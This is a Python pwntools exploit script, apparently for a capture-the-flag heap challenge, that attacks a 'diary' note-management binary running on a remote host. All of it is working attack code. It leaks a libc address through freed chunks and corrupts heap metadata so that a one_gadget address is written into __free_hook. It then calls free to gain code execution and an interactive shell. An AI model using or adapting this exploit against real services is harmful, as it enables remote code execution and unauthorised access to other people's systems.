# %%
from pwn import *

elf = context.binary = ELF('./diary')
context.log_level = 'info'

libc = elf.libc

# %%
gdbscript = '''
break editGrade
# break malloc
continue
'''

# p = process()
p = remote('10.10.15.10', 2228)
# g = gdb.attach(p, gdbscript=gdbscript)

def ri():
    p.recvuntil(b': ')

def malloc(mark, size, comment):
    ri()
    p.sendline(b'1')
    ri()
    p.sendline(f'{mark}'.encode())
    ri()
    p.sendline(f'{size}'.encode())
    ri()
    p.sendline(comment)

def free(index):
    ri()
    p.sendline(b'4')
    ri()
    p.sendline(f'{index}'.encode())

def edit(index, mark, size, comment):
    ri()
    p.sendline(b'2')
    ri()
    p.sendline(f'{index}'.encode())
    ri()
    p.sendline(f'{mark}'.encode())
    ri()
    p.sendline(f'{size}'.encode())
    ri()
    p.sendline(comment)

def show(index):
    ri()
    p.sendline(b'3')
    ri()
    p.sendline(f'{index}'.encode())

for i in range(10):
    malloc(i, 0xf8, str(i).encode() * 0xf8)

for i in range(10)[::-1]:
    free(i)

show(2)
p.recvuntil(b'Comment: ')
d = p.recvuntil(b'1) Add', drop=True)
d = u64(d.ljust(8, b'\x00'))

libc_leak = d
offset = 0x15555532e000 - 0x155555518be0
libc_base = libc_leak + offset

log.success(f'libc leak: {hex(libc_leak)}')
log.success(f'libc base: {hex(libc_base)}')

# hook = libc_base + libc.sym.__malloc_hook
hook = libc_base + libc.sym.__free_hook

log.info(f'hook: {hex(hook)}')

# gadget = p64(libc_base + libc.sym.system)
gadget = p64(libc_base + 0xe69a1)

data = flat(
    0x0000000000000007, 0x0000000000000000,
    0x0000000000000000, 0x0000000700000000,
    0x0000000000000000, 0x0000000000000000,
    0x0000000000000000, 0x0000000000000000,
    0x0000000000000000, 0x0000000000000000,
    0x0000000000000000, 0x0000000000000000,
    0x0000000000000000, 0x0000000000000000,
    0x0000000000000000, 0x0001000000000000,
    hook,
)
edit(3, 1, 0x100, data)
malloc(u32(gadget[:4]), 0xf8, '')

data = flat(
    0x0000000000000007, 0x0000000000000000,
    0x0000000000000000, 0x0000000700000000,
    0x0000000000000000, 0x0000000000000000,
    0x0000000000000000, 0x0000000000000000,
    0x0000000000000000, 0x0000000000000000,
    0x0000000000000000, 0x0000000000000000,
    0x0000000000000000, 0x0000000000000000,
    0x0000000000000000, 0x0001000000000000,
    hook + 0x4,
)
edit(4, 1, 0x100, data)
malloc(u32(gadget[4:]), 0xf8, '')

free(0)

p.interactive()
